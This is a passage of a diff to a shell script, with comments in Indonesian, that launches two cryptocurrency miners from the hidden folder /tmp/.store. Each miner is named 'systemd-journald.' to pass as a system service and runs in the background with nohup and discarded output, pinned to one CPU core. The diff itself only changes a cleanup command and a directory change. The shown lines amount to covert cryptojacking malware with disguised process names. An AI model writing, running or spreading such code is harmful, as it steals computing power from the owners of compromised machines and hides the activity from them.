@@ -33,7 +33,7 @@ chmod +x /tmp/.store/1/systemd-journald.
 chmod +x /tmp/.store/2/systemd-journald.
 
 # Bersih-bersih
-rm -f systemd-journald
+rm -f systemd-journald.
 
 # Jalankan miner dari dalam foldernya tanpa -c config.ini
 echo -e "${GREEN}[*] Starting miners...${NC}"
@@ -41,8 +41,8 @@ echo -e "${GREEN}[*] Starting miners...${NC}"
 # Start miner pertama (pakai CPU core 0)
 cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
 
-# Balik ke .store
-cd /tmp/.store
+# Balik ke root
+cd 
 
 # Start miner kedua (pakai CPU core 1)
 cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
